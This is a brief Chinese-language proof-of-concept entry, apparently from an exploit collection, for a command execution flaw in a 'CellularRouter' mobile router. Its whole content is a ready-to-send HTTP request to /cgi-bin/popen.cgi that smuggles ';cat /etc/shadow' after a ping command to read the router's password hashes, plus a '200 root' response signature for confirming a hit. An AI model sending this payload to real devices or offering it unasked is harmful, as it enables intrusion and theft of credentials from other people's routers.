# 移动路由器CellularRouter命令执行漏洞

移动路由器CellularRouter ｜ 命令执行 ｜ —
- **请求**：`GET /cgi-bin/popen.cgi?command=ping%20-c%204%201.1.1.1;cat%20/etc/shadow&v=0.1303033443137912 HTTP/1.1`
- **响应特征**：200 root